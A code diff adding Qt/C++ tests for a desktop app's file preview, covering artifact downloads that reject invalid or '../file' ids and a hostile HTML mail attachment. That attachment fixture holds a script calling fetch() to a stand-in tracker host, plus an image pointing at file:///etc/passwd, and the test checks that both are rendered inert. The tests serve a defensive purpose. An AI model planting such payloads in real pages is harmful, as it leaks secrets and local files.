@@ -58,7 +58,7 @@ public:
                     int status = 200;
                     if (path == "/api/desktop/auth/refresh") body = R"({"data":{"access_token":"fixture-access","refresh_token":"fixture-refresh-next","token_type":"Bearer","expires_in":600,"user":{"id":"preview-user"}}})";
                     else if (path == "/api/me") body = R"({"user":{"id":"preview-user"},"workspaces":[{"id":"preview-workspace","name":"Preview fixture"}]})";
-                    else if (path.endsWith("/raw")) {
+                    else if (path.endsWith("/raw") || path.startsWith("/api/mail/messages/")) {
                         rawRequests.append(path);
                         if (!bytes.contains("Authorization: Bearer fixture-access") || !files.contains(path)) status = 403;
                         else { body = files.value(path); mime = "application/octet-stream"; }
@@ -79,6 +79,77 @@ class PreviewNavigationTests final : public QObject {
     Q_OBJECT
 private slots:
     void galleryAndFormatAwareViewerUseAuthenticatedArtifacts();
+    void artifactDownloadNormalizesFileWithoutEvictingRetainedPreview() {
+        QTemporaryDir cacheDirectory; QVERIFY(cacheDirectory.isValid());
+        PreviewFixtureApi remote;
+        const QString firstId = "bbbbbbbb-0000-4000-8000-000000000001";
+        const QString secondId = "bbbbbbbb-0000-4000-8000-000000000002";
+        const QString downloadId = "bbbbbbbb-0000-4000-8000-000000000003";
+        remote.files.insert("/api/drive/" + firstId + "/raw", "First retained preview");
+        remote.files.insert("/api/drive/" + secondId + "/raw", "Second retained preview");
+        PreviewCredentials credentials;
+        ApiClient api(remote.origin()); PhoenixClient realtime;
+        SessionController session(api, realtime, nullptr, QUrl("https://mokaid.test"), &credentials);
+        CacheStore cache(cacheDirectory.path()); ArtifactService artifacts(api, session, cache);
+        PreviewController preview(artifacts);
+        connect(&preview, &PreviewController::replacementRequested, &preview, &PreviewController::commitOpen);
+        session.restore(); QTRY_VERIFY(session.authenticated()); QTRY_VERIFY(!session.busy());
+        session.selectWorkspace("preview-workspace"); QTRY_COMPARE(session.workspaceId(), QString("preview-workspace"));
+        preview.openCollection({
+            QVariantMap{{"id", firstId}, {"name", "First.txt"}, {"mime_type", "text/plain"}},
+            QVariantMap{{"id", secondId}, {"name", "Second.txt"}, {"mime_type", "text/plain"}}
+        });
+        QTRY_VERIFY(preview.documents()[0].value<PreviewDocument*>());
+        preview.next();
+        QTRY_VERIFY(preview.documents()[1].value<PreviewDocument*>());
+        QTRY_VERIFY(!preview.loading());
+        QCOMPARE(preview.collectionIndex(), 1);
+        const auto documents = preview.documents();
+        const auto collection = preview.collectionFiles();
+        const auto activeIndex = preview.activeIndex();
+        const auto requests = remote.rawRequests;
+        const QVariantMap artifact{{"id", "cccccccc-0000-4000-8000-000000000001"},
+            {"drive_item_id", downloadId}, {"filename", "Completed report.pdf"},
+            {"content_type", "application/pdf"}, {"kind", "document"}, {"size_bytes", 1024}};
+        QSignalSpy downloads(&preview, &PreviewController::downloadRequested);
+        QSignalSpy changes(&preview, &PreviewController::changed);
+        QSignalSpy replacements(&preview, &PreviewController::replacementRequested);
+        QSignalSpy clears(&preview, &PreviewController::clearViewsRequested);
+        // Download from the completion modal must preserve a visible or hidden
+        // preview, including both retained documents and the gallery selection.
+        for (const bool visible : {false, true}) {
+            preview.setVisible(visible); changes.clear();
+            const auto revision = preview.openRevision();
+            downloads.clear(); preview.downloadFile(artifact);
+            QCOMPARE(downloads.size(), 1);
+            const auto downloaded = downloads.first().first().toMap();
+            QCOMPARE(downloaded.value("id").toString(), downloadId);
+            QCOMPARE(downloaded.value("name").toString(), QString("Completed report.pdf"));
+            QCOMPARE(downloaded.value("mime_type").toString(), QString("application/pdf"));
+            QCOMPARE(downloaded.value("kind").toString(), QString("file"));
+            QCOMPARE(downloaded.value("status").toString(), QString("active"));
+            QCOMPARE(downloaded.value("size_bytes").toInt(), 1024);
+            QCOMPARE(artifact.value("id").toString(), QString("cccccccc-0000-4000-8000-000000000001"));
+            QVERIFY(!artifact.contains("name"));
+            for (const auto& invalid : QVariantList{
+                    QVariantMap{}, QVariantMap{{"id", "invalid"}},
+                    QVariantMap{{"id", "../file"}},
+                    QVariantMap{{"id", downloadId}, {"drive_item_id", "invalid"}, {"filename", "Invalid.pdf"}}})
+                preview.downloadFile(invalid.toMap());
+            QCOMPARE(downloads.size(), 1);
+            QCOMPARE(preview.documents(), documents);
+            QCOMPARE(preview.collectionFiles(), collection);
+            QCOMPARE(preview.collectionIndex(), 1);
+            QCOMPARE(preview.activeIndex(), activeIndex);
+            QCOMPARE(preview.openRevision(), revision);
+            QCOMPARE(preview.visible(), visible);
+            QVERIFY(!preview.loading()); QVERIFY(preview.error().isEmpty());
+            QCOMPARE(changes.size(), 0); QCOMPARE(replacements.size(), 0); QCOMPARE(clears.size(), 0);
+            QCOMPARE(remote.rawRequests, requests);
+            for (const auto& document : documents)
+                QVERIFY(QFile::exists(document.value<PreviewDocument*>()->localSource().toLocalFile()));
+        }
+    }
     void filesButtonRequestsNativeNavigationWithoutEvictingPreviewState() {
         QTemporaryDir qmlDirectory, cacheDirectory;
         QVERIFY(qmlDirectory.isValid()); QVERIFY(cacheDirectory.isValid());
@@ -206,6 +277,7 @@ Rectangle {
         }
         return null
     }
+    function activeJavascriptEnabled() { const browser=findBrowser(viewer.activeView); return !browser || browser.settings.javascriptEnabled; }
     function probeAudio() {
         const browser = findBrowser(viewer.activeView)
         if (!browser || mediaProbePending) return
@@ -311,6 +383,26 @@ Rectangle {
             if (root->property("mediaReadyState").toInt() >= 1) return true;
             QMetaObject::invokeMethod(root.get(), "probeAudio"); return false;
         })(), 10000);
+        const QString mailPath="/api/mail/messages/fixture-message/attachments/fixture-html";
+        remote.files.insert(mailPath,"<html><script>fetch('https://tracker.test/secret')</script><img src='file:///etc/passwd'><img src='https://tracker.test/pixel'><p>Attachment preview safety fixture</p></html>");
+        preview.openFile({{"id","aaaaaaaa-0000-4000-8000-000000000006"},{"name","Unexpected content.pdf"},{"mime_type","application/pdf"},{"mail_message_id","fixture-message"},{"mail_attachment_id","fixture-html"}});
+        QTRY_VERIFY(!preview.loading());
+        auto* mailDocument=preview.documents()[preview.activeIndex()].value<PreviewDocument*>(); QVERIFY(mailDocument);
+        QCOMPARE(mailDocument->kind(),QString("text")); QVERIFY(mailDocument->scripts().isEmpty());
+        QVERIFY(!preview.nativePreviewAvailable()); QVERIFY(remote.rawRequests.contains(mailPath));
+        QVariant javascriptEnabled;
+        QVERIFY(QMetaObject::invokeMethod(root.get(),"activeJavascriptEnabled",Q_RETURN_ARG(QVariant,javascriptEnabled)));
+        QVERIFY(!javascriptEnabled.toBool());
+        QTest::qWait(400); capture("mail-attachment-html-inert");
+        remote.files.insert("/api/mail/messages/fixture-message/attachments/fixture-pdf",pdfBytes);
+        preview.openFile({{"id","aaaaaaaa-0000-4000-8000-000000000007"},{"name","Campaign overview.pdf"},{"mime_type","application/pdf"},{"mail_message_id","fixture-message"},{"mail_attachment_id","fixture-pdf"}});
+        QTRY_VERIFY(!preview.loading());
+        QTRY_COMPARE(preview.documents()[preview.activeIndex()].value<PreviewDocument*>()->kind(),QString("pdf"));
+        const auto* pdfAttachment=preview.documents()[preview.activeIndex()].value<PreviewDocument*>();
+        QVERIFY(pdfAttachment->scripts().isEmpty()); QVERIFY(pdfAttachment->localSource().path().endsWith(".pdf"));
+        QFile safePdf(pdfAttachment->localSource().toLocalFile()); QVERIFY(safePdf.open(QIODevice::ReadOnly)); QVERIFY(safePdf.read(5)=="%PDF-");
+        QVERIFY(visualItem(item,"nativeAttachmentPreview"));
+        capture("mail-attachment-pdf-native-fallback");
         QVERIFY2(warnings.isEmpty(), qPrintable(warnings.join('\n')));
         preview.clear(); QTRY_VERIFY(preview.documents()[0].value<PreviewDocument*>() == nullptr); QCOMPARE(preview.collectionCount(), 0);
         QVERIFY(!QFile::exists(textSource)); QVERIFY(!QFile::exists(thumbnailSource));
